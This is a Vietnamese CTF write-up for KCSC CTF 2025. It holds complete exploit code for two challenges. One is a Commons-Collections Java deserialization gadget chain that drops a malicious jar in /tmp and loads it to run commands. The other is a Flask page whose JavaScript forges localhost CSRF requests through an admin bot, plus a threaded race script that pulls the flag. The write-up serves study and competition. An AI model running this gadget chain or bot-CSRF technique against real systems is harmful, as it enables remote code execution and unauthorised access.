---
layout: post
title:  "KCSC CTF 2025"
date:   2025-09-05 10:00:00 +0700
tag: Writeup, KCSC2025
categories: jekyll update
---

# Legacy 

Ban đầu bài này chỉ cho mình một source code viết bằng java. 

Có class Controller.java là có các endpoint của ứng dụng. Mà quan trọng mình thấy nó có dòng 22 là `readObject().toString()` cho nên đây có thể là một bài java deserialize. 

![image](https://hackmd.io/_uploads/rJsXfY7bll.png)

Quan sát tiếp thì thấy có dùng thư viện `Commons-Collections-3.2.1` và dùng `java-17`

Bài này lấy ý tưởng như một CVE sau: [link](https://cn-sec.com/archives/711453.html)

Ở JDK17 này thì không thể dùng sink `TemplateImpl` nên ta exploit thông qua sink `InvokerTransformer + ChainedTransformer`, như trong Commons-Collections5

Với ý tưởng là lấy output ta sẽ viết malicious jar thực thi payload và quăng output ra ngoài như sau: 

```Java=
import java.io.BufferedReader;
import java.io.InputStreamReader;
public class RunCheckConfig {
    public RunCheckConfig(String  args) throws Exception
    {
        Process proc = Runtime.getRuntime().exec(args);
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = br.readLine()) != null)
        {
            sb.append(line).append("\n");
        }
        String result = sb.toString();
        Exception e=new Exception(result);
        throw e;
        }
    }
```

Ta sẽ compile file lại, rồi build lại thành file jar 
```bash
javac RunCheckConfig.java
jar -cvf RunCheckConfig.jar RunCheckConfig.class
```
Do trong bài đã gọi tới `toString()` nên không cần dùng `BadAttributeValueExpException`

Đầu tiên ta sẽ dùng `FileOutputStream` để ghi file jar độc hại. 

```java=
 Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.io.FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
//                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"RunCheckConfig.jar"} }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"/tmp/RunCheckConfig.jar"} }),
                new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { classBytes }),
                new ConstantTransformer(1) };
```

Sau khi save file độc hại lên server sau đó dùng `URLClassLoader` để load 

```java=
Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.net.URLClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { java.net.URL[].class } }),
//                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///D:\\Labs\\My_CTF_Chall\\KCSC2025\\java-med\\Legacy\\Legacy\\RunCheckConfig.jar") } } }),
                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///tmp/RunCheckConfig.jar") } } }),
                new InvokerTransformer("loadClass", new Class[] { String.class }, new Object[] { "RunCheckConfig" }),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] { cmd } }),
                new ConstantTransformer(1) };
```

Tóm lại ta có thể code Exploit như sau: 

```java=
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.net.MalformedURLException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exploit {

    public static byte[] setupPayload() throws IOException {
        byte[] classBytes = genBytesContent();

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.io.FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
//                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"RunCheckConfig.jar"} }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] {"/tmp/RunCheckConfig.jar"} }),
                new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { classBytes }),
                new ConstantTransformer(1) };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map lazyMap = (Map) LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry tied = new TiedMapEntry(lazyMap, 1);

        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(tied);
            oos.close();
            return bos.toByteArray();
        } catch (IOException e) { throw new RuntimeException(e); }
    }

    // javac RunCheckConfig.java
    // jar -cvf RunCheckConfig.jar RunCheckConfig.class
    public static byte[] genBytesContent() throws IOException {
        String classFilePath = "RunCheckConfig.jar";
        return Files.readAllBytes(Paths.get(classFilePath));
    }

    public static byte[] rcePayload(String cmd) throws MalformedURLException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.net.URLClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { java.net.URL[].class } }),
//                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///D:\\Labs\\My_CTF_Chall\\KCSC2025\\java-med\\Legacy\\Legacy\\RunCheckConfig.jar") } } }),
                new InvokerTransformer( "newInstance", new Class[] { Object[].class }, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL( "file:///tmp/RunCheckConfig.jar") } } }),
                new InvokerTransformer("loadClass", new Class[] { String.class }, new Object[] { "RunCheckConfig" }),
                new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
                new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] { new String[] { cmd } }),
                new ConstantTransformer(1) };

        ChainedTransformer chain = new ChainedTransformer(transformers);
        Map lazyMap = (Map) LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry tied = new TiedMapEntry(lazyMap, 1);

        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(tied);
            oos.close();
            return bos.toByteArray();
        } catch (IOException e) { throw new RuntimeException(e);}
    }

    public static void main(String[] args) throws IOException {
        byte[] setupPayload = setupPayload();
        System.out.println("Setup Payload");
        System.out.println(Base64.getEncoder().encodeToString(setupPayload));

        byte[] payload = rcePayload("id");
        System.out.println("Payload");
        System.out.println(Base64.getEncoder().encodeToString(payload));
    }
}
```

* Kết quả: 

Bước 1 viết file malicious jar 

![image](https://hackmd.io/_uploads/rJa2FYQWgx.png)

Bước 2 trigger file malicious jar ra output 

![image](https://hackmd.io/_uploads/Hytvct7Zeg.png)

# Ez Note 

## Giao diện web 

![image](https://hackmd.io/_uploads/BJFK0rS9ex.png)

Mình sẽ phải register 1 tài khoản hợp lệ 

![image](https://hackmd.io/_uploads/HJvw0BS9el.png)

Sau khi login vào thì mình được chuyển đến trang dashboard chứa những bài post. 

![image](https://hackmd.io/_uploads/HJosRrB9eg.png)

Ở đây mình có thể tạo 1 bài post. 

![image](https://hackmd.io/_uploads/rJV0ABBqlx.png)

Khi tạo bài thì mình được quyền để chế độ bài post này ở chế độ `public` hoặc `private`.

![image](https://hackmd.io/_uploads/Skr-xIr5el.png)

Và khi truy cập vào 1 bài post, mình sẽ có 1 chức năng là tạo ra 1 `access-code` dùng để chỉ định cho người dùng khác mún truy cập vào bài viết của mình thì phải cung cấp đúng `access-code` này. 

![image](https://hackmd.io/_uploads/ByXUxLrcxl.png)

![image](https://hackmd.io/_uploads/B1JRxUSqge.png)

## Review Source Code 

![image](https://hackmd.io/_uploads/ryCX18rclg.png)

Đây là toàn bộ source code của challenge này. 

### File `routes.go`
Mình sẽ bắt đầu đi từ file `routes.go` nhóe !! 

![image](https://hackmd.io/_uploads/Hk-of8Bcxg.png)

Ở đây, tìm thấy được `route` ở ứng dụng web này. 
- `/login`
- `/register`
Được bảo vệ trong `AuthMiddleware`:
- `GET /posts`
- `GET /post/new`
- `GET /report`
- `GET /post/:id`
- `GET /logout`
Được bảo vệ trong `CsrfMiddleware`:
- `POST /report`
- `POST /post`
- `POST /post/:id/access-code`

Trước hết, mình sẽ đi qua các nhóm không được bảo vệ là `login` và `register`

### Nhóm ko được bảo vệ `public` 

![image](https://hackmd.io/_uploads/SyGHmjLcxg.png)

Khi user truy cập `/` thì nó sẽ gọi `controller.Index` là file `index_controller.go` tại folder `controller`

Rồi tiếp tục redirect về `/login`. Và `/login` thì gọi tới `LoginIndex` để render ra template `login`.

![image](https://hackmd.io/_uploads/BkRvKUHqle.png)

Tương tự khi truy cập với `register` cũng render ra template.

Khi user truy cập với các endpoint `login` và `register` với method POST thì nó sẽ gọi tới `LoginHandler` và `RegisterHandler` của file `auth_controller.go` tại folder `controller`

Với `POST /register` như sau:

![image](https://hackmd.io/_uploads/rJ2nW58qxl.png)

Ở đây, nó thực hiện lấy dữ liệu từ form nếu không đúng thì sẽ render lại template `register.html` và in ra `Invalid input`. Và nếu hợp lí thì nó sẽ gọi tới `services.RegisterUser` tại `services/auth_service.go`

![image](https://hackmd.io/_uploads/r1ePLGqIqll.png)

Hàm này sẽ thực hiện gọi đến `models.User` được định sẵn cấu trúc. Sau đó, nó gán vào trong `Username` và thực hiện Hash password. Và trả về kết quả tạo 1 bảng `user` trong DB. 

Đây là file `user.go` trong `models` được gọi tới. 

![image](https://hackmd.io/_uploads/ryhTI9U9eg.png)

Đến với phần xử `POST /login` trong file `auth_controller.go`

![image](https://hackmd.io/_uploads/SkgEP9Icxl.png)

Khi `login` thì nó sẽ gọi tới `services.LoginUser` và`services.CreateAuthWithCSRF` được xử lý tại `services/auth_service.go`

![image](https://hackmd.io/_uploads/B15f_q8cxe.png)

Khi đó nó sẽ thực hiện query trong DB dựa vào `username` và gọi `models.User` để gọi hàm `CheckPassword`

Sau đó, gọi tới hàm `CreateAuthWithCSRF` thì trong này sẽ tạo ra `csrfToken` dựa vào hàm `GenerateCSRFToken()` nằm ở cuối. 

![image](https://hackmd.io/_uploads/rkTNFqUqle.png)

Hàm này sẽ thực hiện sinh ra 1 `csrf token` 32 byte ngẫu nhiên, sau đó trả về bằng cách encode base64. 

Cuối cùng, nó tạo 1 `token` dựa vào `username`, `userID` và `csrfToken` gọi tới hàm `GenerateJWTWithCSRF` 

![image](https://hackmd.io/_uploads/HkqNcq8qll.png)

Khi tạo 1 JWT thì nó sẽ kèm với trường `expirationTime` là thời gian hết hạn, token này sống được 24h. Và JWT này dùng thuật toán HS256 và ký bằng `jwtKey` được sinh ra từ biến môi trường của hệ thống. 

![image](https://hackmd.io/_uploads/S1easqLqxl.png)

Như vậy tóm tắt lại được lưu trong Cookie sẽ có: 
- `csrfToken` -> 1 giờ
- `token` là JWT và chứa `csrfToken` bên trong -> 24 giờ 

![image](https://hackmd.io/_uploads/BkRAn9Icge.png)


### Nhóm được bảo vệ bởi `AuthMiddleWare`

![image](https://hackmd.io/_uploads/H1rg4s8qge.png)

Ở nhóm này khi người dùng muốn truy cập vào các route kia thì phải đi qua 1 bước xác thực. 

Mình sẽ tìm hiểu qua file `auth_middleware.go` tại folder `middle`. 

### File `auth_middleware`

![image](https://hackmd.io/_uploads/Hy4VLsUqel.png)

Ở đây, nó sẽ thực hiện lấy `userID` được lưu trong DB. Để kiểm tra xem user này đã được xác thực chưa nếu rồi thì đi qua bước tiếp theo. 

Nếu chưa thì nó sẽ lấy token và không có token thì thực hiện xem xét nếu là request từ `127.0.0.1` hay `::1` thì thực hiện tạo `csrfToken` với `username` là `admin` và `userID` là `1` nếu ko có lỗi gì xảy ra thì gán vào Cookie `token` và `csrf_token`, `username` là `admin` và `userId` là `1`. 

Còn nếu ko phải request từ `localhost` thì nó sẽ gọi tới hàm `services.ValidateToken` tại  `services/auth_service.go`

![image](https://hackmd.io/_uploads/H1uBioLqll.png)

Hàm này sẽ phân tích kiểm tra token có tính hợp lệ hay ko. 
Nếu hợp lệ thì sau cũng nó sẽ set `username` và `userID` lấy từ `token`.

![image](https://hackmd.io/_uploads/S19W3s8clx.png)

Tóm lại sẽ xác thực trước khi đi vào các routes 
- Nếu ko có token mà request đến từ local sẽ được set admin
- Nếu ổn thì cho qua 

Mục tiêu là phải `login` rồi được truy cập.

Khi user gọi đến route `/posts` thì nó sẽ gọi tới hàm `GetPostHandler` tại `controller/post_controller.go`

![image](https://hackmd.io/_uploads/r1Ix6o8qgx.png)

Hàm này sẽ thực hiện lấy `userID` trong DB, sau đó gọi tới hàm `services.GetUserPosts` tại `services/post_service.go`

![image](https://hackmd.io/_uploads/BkhPaoUqee.png)

Ở đây sẽ query lấy tất cả bài post dựa trên `userID`. 

Tiếp theo khi user truy cập `/post/new` thì nó sẽ gọi `PostNewIndex` tại `controller/post_controller.go` mục đích là render ra template. 

![image](https://hackmd.io/_uploads/BkgkMCsI5ee.png)

Khi user truy cập route `/post/:id` thì nó sẽ gọi `GetPostHandler` tại `controller/post_controller.go` 

![image](https://hackmd.io/_uploads/HkVi12I9le.png)

Hàm này sẽ thực hiện kiểm tra qua tham số `id` nếu hợp lệ thì gọi hàm `services.GetPostByID` tại `services/post_service.go` để thực hiện query dựa vào `id`. 

![image](https://hackmd.io/_uploads/Sk_Hb3Iqxl.png)

Hàm này sẽ thực hiện kết nối tời DB để query ra các thông tin bài post dựa vào `postID`. 

Khi user truy cập vào `/logout` thì nó sẽ gọi `LogoutHandler` tại `controller/auth_controller.go`

![image](https://hackmd.io/_uploads/HyKfT9Lqel.png)

Hàm này đơn giản chỉ để xóa đi `csrfToken` rồi chuyển hướng đến `/login`

Khi user truy cập `/report` sẽ gọi tới `ReportIndex` tại `controller/report_controller.go` 

![image](https://hackmd.io/_uploads/BJE9Vn8qgg.png)

Thực hiện render ra template. 

### Nhóm được bảo về bởi `CsrfMiddleware`

![image](https://hackmd.io/_uploads/Byy3BhI5le.png)

Theo như trên thì các nhóm `/api` được bảo vệ chỉ có bởi `CsrfMiddleware`, nhưng quan sát kỹ thì thấy `/api` được gán thêm `protected` cho nên nó bao gồm `AuthMiddleware` + `CsrfMiddleware` 

Mình sẽ phân tích file `CsrfMiddleware` xem nó hoạt động như thế nào nha. 

### File `csrf_middleware.go`

![image](https://hackmd.io/_uploads/B1WYd3Icxe.png)

![image](https://hackmd.io/_uploads/ryki_nL5el.png)

Đầu tiên nó sẽ kiểm tra rằng nếu method là `OPTIONS` thì nó chặn. 

Tiếp theo là request là mà có `Content-Type` là rỗng thì bỏ qua. Nghĩa là chỉ check Csrf với `POST, PUT, DELTE`.

Sau đó, lấy trường `token` trong Cookie nếu ko có thì hiển thị `Authentication required`. 

Và nếu ko lỗi thì gọi tới `services.ValidateToken` để phân tích xem token gửi lên có hợp lệ ko. Nếu hợp lệ thì lấy trường `X-CSRF-Token` trong header.

Ở đây thì có 1 thắc mắc là tại sao lòi ra `X-CSRF-Token` nữa. Thì khi quan sát trong các template. 

![image](https://hackmd.io/_uploads/SyE9clw5xx.png)

Nghĩa là trong template ở phần javascript sẽ đảm nhận các phần fetch tới các `api` thì sẽ gửi kèm thêm header `X-CSRF-Token` 

Và nếu `csrfToken` bằng rỗng thì hiển thị thông báo, khi đó nó sẽ gọi `ValidateCSRFToken` nếu có lỗi thì sẽ in ra. 

![image](https://hackmd.io/_uploads/HJWFZ7v9el.png)

Hàm nãy sẽ decode ra rồi so sánh xem có bằng với `crsftoken` lưu trong `token` hay ko, nếu có thì hợp lệ.

Tóm lại file `csrf_middleware.go` sẽ đảm bảo khi gọi tới các `/api` thì user phải ở trạng đã xác thực `login` bằng `auth_middleware` và `csrf_middleware`.

Khi user gửi `POST /post` thì nó sẽ gọi tới `CreatePostHandler` của file `post_controller.go` tại `controller/post_controller.go`

![image](https://hackmd.io/_uploads/Bkn2whLqgl.png)

Nó sẽ gán các trường `Title`, `Content` là String còn `IsPrivate` là bool và mặc định nó là `false`. 

Khi đó sẽ gọi tới hàm `services.CreatePost` tại `services/post_service.go` 

![image](https://hackmd.io/_uploads/BJwuuzv5el.png)

Nó sẽ tạo và lưu dựa vào `models.Post`, sau đó nó lưu vào trong DB. 

![image](https://hackmd.io/_uploads/B15DRzwqee.png)

Ở đây thì định nghĩa ra cấu trúc của bài Post gồm `Title`, `Content` là String,... và `AccessCode` là String, cúi cùng là `Accesses` là 1 mảng `Access`. Và mảng `Access` cũng được định nghĩa phía dưới. Là gồm các trường `Username`, `AccessCode` là String và nếu ko có thì mặc định nó là `1337`. 

Khi user gọi `/api/post/:id/access-code`, thì nó sẽ gọi `GenerateAccessCodeHandler` tại `controller/post_controller.go` 

![image](https://hackmd.io/_uploads/HJh3tzv9gx.png)

![image](https://hackmd.io/_uploads/S1klqMPqge.png)

Đầu tiên, nó sẽ lấy tham số `id` và nếu ko hợp lệ thì in ra lỗi. Và nếu hợp lệ thì nó sẽ lấy bài post dựa vào `services.GetPostByID` tại `services/post_services.go`.
Để có thể lấy bài post dựa vào đúng `id` đã cung cấp. 

Sau đó, nó sẽ lấy `UserID` đã được xác thực từ `auth_middleware.go` trước đó. Và so sánh với `UserID` của bài post nếu ko trùng thì in ra `You dont own this post`. 

Tiếp đó, thì nó tiếp các trường `ValidHours`, `CustomCode` (max chỉ có 10 kí tự) và `Username`. Thì những trong JS nó sẽ được map vào trong struct này. 

Và tiếp tục, gọi tới `services.GetUserByUsername` tại `services/post_services.go`. Nó sẽ kiểm tra xem có `username` đó ko, nếu ko có thì in ra `Invalid username`.
Nếu có `username` thì tiếp tục gọi tới `services.GenerateUserSpecificAccessCode` tại `services/post_services.go` 

![image](https://hackmd.io/_uploads/B1ryCzwcle.png)

Đầu tiên, nó sẽ tạo lấy dựa vào `models.Access` các trường `PostID`, `ExpiresAt` và `Username`. Sau đó, gọi tới DB để tạo `access`. 

Tiếp đó, nó sinh ra 12 byte ngẫu nhiên. Sau đó, `accessCode` thì nó được tạo ra từ `customCode` nối với 1 chuỗi 16 ký tự đã encode Base64. Rồi lại gọi tới DB để lưu `accessCode` này (update). 

Khi user gọi tới `POST /report` thì nó gọi `ReportHandler` của file `report_controller.go` tại `controller/report_controller.go` 

![image](https://hackmd.io/_uploads/H1gxX7D9lg.png)

Hàm này sẽ thực hiện nhận 1 vào URL qua tham số `url`, sau đó thực hiện `exec.Commad` nghĩa là lệnh từ OS. Chạy file `/app/bot/bot.js`. Sau đó, trả về trạng thái theo dạng JSON.

Mình sẽ tìm hiểu file `/app/bot/bot.js` 

![image](https://hackmd.io/_uploads/ByLZ4Xvcel.png)

![image](https://hackmd.io/_uploads/BymmE7wqxx.png)

Mình sẽ mô tả lệnh bot khi chạy `node /app/bot/bot.js http://test.abc` cho nên nó sẽ lấy `url` qua `const targetUrl = process.argv[2]`. 

Tiếp theo, set các biến môi trường `username` là `admin`, `password` là biến môi trường. 

Sau đó, nó mở 1 trình duyệt dưới dạng `handless` là chạy ngầm. 

Bot nó sẽ mở 1 trang mới, truy cập đến url đã cung cấp. Sau đó

Đến với file cuối cùng là `main.go`

![image](https://hackmd.io/_uploads/HJ8ovXDcle.png)

![image](https://hackmd.io/_uploads/r1d1Omwcgl.png)

Mục tiêu của file này là sẽ tạo ra 1 tài khoản `admin` và password được lấy từ biến môi trường.

Sau đó, nó tạo `flagpost` chỉ thuộc về username `admin` vì `UserID: adminUser.ID` với nội dung của flag được set trong biến môi trường. Như vậy bài post này được tạo thì `id` nó là 1. 

## Flow khai thác 

1. Quan sát ứng dụng 
- Có sẵn user `admin` và một bài viết (id=1) chứa flag, gắn với admin, đặt ở chế độ private

![image](https://hackmd.io/_uploads/Hk3BcJuqgg.png)

- Muốn xem được post này cần thỏa 2 điều kiện: 
    - `UserID` khớp với `admin`
    - có một access code hợp lệ do admin cấp 

2. Phân tích bot 
- Hệ thống có endpoint `/api/report?url=...` để gửi link cho bot 
- Bot chạy Chromium handless và nhấp vào link được gửi 
- Bot ko login bằng admin (ko có code nào login trong `bot.js`)
- Nhưng bot chạy môi trường cùng local network với (có thể gửi request đến 127.0.0.1:19101)

3. Ý tưởng tấn công 
- Lợi dụng bot để thực hiện `CSRF từ localhost`
    - Khi bot mở link của mình, trong đó có Javascript spam request tới `http://127.0.0.1:19101/api/post/1/access-code`
    - Mỗi request tạo 1 access code mới (mục tiêu là server bị nghẽn và chấp nhận tạo ra 1 access code mặc định là 1337)
    - Vì request xuất phát từ localhost nên server tin cậy và chấp nhận tạo access-code cho post ID = 1 

4. Thực thi 
- Tạo 1 webhook server (flask) trả về HTML/JS, trong đó có vòng lặp gửi 5000 request tới API `/api/post/1/access-code`
- Gửi URL webhook này cho bot thông qua `/api/report`
- Bot sẽ load trang, thực thi JS, và spam request tạo access code cho Post ID = 1, attacker chỉ việc truy cập `/post/1?code=1337`

5. Lấy Flag 
- Ở phía attacker 
    - Đăng ký và login một tài khoản bình thường 
    - Gửi report tới bot với URL webhook 
    - Đồng thời script local liên tục gửi request tới `GET /post/1?code=1337`
- Sau khi bot đã tạo dùm access code `1337` cho Post ID = 1, attacker chỉ cần truy cập `/post/1/?code=1337`
- Vì access code hợp lệ, post private được hiển thị -> lộ flag 

### Khai thác 

#### File `webhook.py`

```Python= 
from flask import Flask, request, make_response 
from flask_cors import CORS 

app = Flask(__name__)
CORS(app)

HTML_RESPONSE = """
<!DOCTYPE html> 
<html>
<head>
    <title>Webhook Received</title>
</head>
<body>
    <h1>Webhook Received</h1>
    <script>
        for (let i = 1; i < 5000; i++) {
            fetch ("http://127.0.0.1:19101/api/post/1/access-code", {
                method: "POST",
                body: JSON.stringify({
                    valid_hours: 24, 
                    username: "hoangphuc",
                    custom_code: "0123456789"
                }),
                credentials: "include"
            })
        }
    </script>
</body>
</html>
"""

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def webhook(path):
    print(f"✅ Received {request.method} request on /{path}")
    response = make_response(HTML_RESPONSE, 200)
    response.headers['Content-Type'] = 'text/html'
    return response 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

File `webhook.py` này sẽ thực hiện bằng cách khi bot nhấp vào thì sẽ fetch tới endpoint tạo access-code 5000 lần. 

Mình sẽ chạy file này và public nó qua ngrok. 

![image](https://hackmd.io/_uploads/Sy-5ixd5xg.png)

![image](https://hackmd.io/_uploads/ryP2jlO9lx.png)

#### File `script.py`

```python=
import requests 
import threading 
import time 
import os 
import urllib.parse 
from bs4 import BeautifulSoup
import re 

BASE_URL = "http://localhost:19101"
NUM_GET_REQUESTS = 5000 
FLAG_REGEX = r"KMCTF\{[^\}]+\}"
TEST_USERNAME = "hoangphuc"
TEST_PASSWORD = "hoangphuc"
REGISTER_URL = f"{BASE_URL}/register"
LOGIN_URL = f"{BASE_URL}/login"
REPORT_POST_URL = f"{BASE_URL}/api/report?url=http%3A%2F%2F0.tcp.ap.ngrok.io%3A11165"
ACCESS_GET_URL = f"{BASE_URL}/post/1?code=1337"

stop_event = threading.Event() 

def find_and_print_flag(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    post_content_divs = soup.find_all('div', class_='post-content')
    for div in post_content_divs:
        content_text = div.get_text()
        match = re.search(FLAG_REGEX, content_text)
        flag = match.group(0)
        print(f"🎉 Found flag: {flag}")
        stop_event.set()
        os._exit(0)
        
def register_user(session, username, password):
    data = {
        "username": username,
        "password": password
    }
    session.post(REGISTER_URL, data=data, headers={"Referer": f"{BASE_URL}/register"})
    
def login_user(session, username, password):
    data = {
        "username": username,
        "password": password
    }
    session.post(LOGIN_URL, data=data, headers={"Referer": LOGIN_URL}, allow_redirects=True)
    
def send_report_post_request(session, csrf_token_header_value):
    if stop_event.is_set():
        return 
    X_CSRF_Token_header = {"X-CSRF-Token": csrf_token_header_value}
    session.post(REPORT_POST_URL, headers=X_CSRF_Token_header)
    
def send_access_get_request(session, request_id):
    if stop_event.is_set():
        return 
    response = session.get(ACCESS_GET_URL)
    if response.status_code == 200:
        find_and_print_flag(response.text) 

if __name__ == "__main__":
    print("🔄 Starting script...")
    s = requests.Session()
    register_user(s, TEST_USERNAME, TEST_PASSWORD)
    login_user(s, TEST_USERNAME, TEST_PASSWORD)
    csrf_token_cookie_value = s.cookies.get("csrf_token")
    print(f"🔑 CSRF token (cookie): {csrf_token_cookie_value}")
    csrf_token_for_header = urllib.parse.quote(str(csrf_token_cookie_value))
    print(f"🔑 CSRF token (header): {csrf_token_for_header}")
    post_thread = threading.Thread(target=send_report_post_request, args=(s, csrf_token_for_header))
    get_threads = []
    for i in range(NUM_GET_REQUESTS):
        thread = threading.Thread(target=send_access_get_request, args=(s, i + 1))
        get_threads.append(thread)    
    
    all_threads = [post_thread] + get_threads 
    
    for thread_idx, thread_obj in enumerate(all_threads):
        if stop_event.is_set():
            break 
        thread_obj.start()
    
    for thread_obj in all_threads:
        if thread_obj.is_alive():
            thread_obj.join()
``` 

ý nghĩa của script này:
- register
- login 
- sau đó, chạy các thread với nhau bao gồm 1 thread tới post report và 5000 thread còn lại tới `/post/1?code=1337`

![image](https://hackmd.io/_uploads/H1iTnZu5lx.png)










